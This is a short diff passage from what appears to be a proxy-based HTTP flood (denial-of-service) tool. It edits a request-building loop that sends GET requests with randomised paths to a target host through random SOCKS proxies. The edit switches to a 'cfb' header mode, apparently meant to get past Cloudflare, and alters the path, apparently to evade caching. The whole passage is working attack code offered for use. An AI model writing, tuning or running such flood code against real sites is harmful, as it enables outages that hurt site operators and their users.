@@ -792,9 +792,9 @@ def slow(conn, socks_type):
             proxy = Choice(proxies).strip().split(":")
 
 def ran(event, socks_type):
-    header = Headers("get")
+    header = Headers("cfb")
     proxy = Choice(proxies).strip().split(":")
-    get_host = "GET " + path + "/" + str(random._urandom(30)) + "HTTP/1.1\r\nHost: " + target + "\r\n"
+    get_host = "GET " + path + "?/" + str(random._urandom(30)) + "HTTP/1.1\r\nHost: " + target + "\r\n"
     request = get_host + header
     event.wait()
     while time.time() < timer:
